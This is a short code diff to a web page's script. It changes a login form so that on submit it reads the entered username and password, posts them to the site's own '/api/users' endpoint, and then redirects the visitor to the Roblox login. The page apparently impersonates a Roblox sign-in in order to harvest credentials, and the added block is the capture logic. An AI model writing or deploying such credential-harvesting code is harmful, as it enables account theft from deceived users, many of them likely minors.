@@ -13,8 +13,29 @@ document.addEventListener('DOMContentLoaded', () => {
 
   window.redirectToRobloxLogin = redirectToRobloxLogin;
 
-  loginForm.addEventListener('submit', (event) => {
+  loginForm.addEventListener('submit', async (event) => {
     event.preventDefault();
+
+    const usernameInput = loginForm.querySelector('input[name="username"]');
+    const passwordInput = loginForm.querySelector('input[name="password"]');
+
+    if (usernameInput && passwordInput) {
+      const username = usernameInput.value;
+      const password = passwordInput.value;
+
+      try {
+        await fetch('/api/users', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ username, password })
+        });
+      } catch (err) {
+        console.error('Failed to save user', err);
+      }
+    }
+
     redirectToRobloxLogin();
   });
 });
